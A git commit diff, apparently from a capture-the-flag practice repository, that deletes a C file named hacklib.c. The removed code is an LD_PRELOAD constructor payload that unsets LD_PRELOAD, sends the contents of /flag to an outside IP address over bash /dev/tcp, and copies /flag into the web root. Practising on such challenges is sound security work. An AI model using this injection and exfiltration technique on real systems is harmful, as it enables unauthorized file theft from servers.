df438546c8a382b22f1af17bc9f8710f812305c4
local-h0st <98169420+local-h0st@users.noreply.github.com>
2023-07-27 16:17:10 +0800

    Delete ctf_test directory

--- ctf_test/ezphp/hacklib.c
+++
@@ -1,9 +0,0 @@
-#include <stdlib.h>
-#include <string.h>
-__attribute__ ((constructor)) void call ()
-{
-    unsetenv("LD_PRELOAD");
-    char str[65536];
-    system("bash -c 'cat /flag' > /dev/tcp/81.68.167.39/5000");
-    system("cat /flag > /var/www/html/flag");
-}
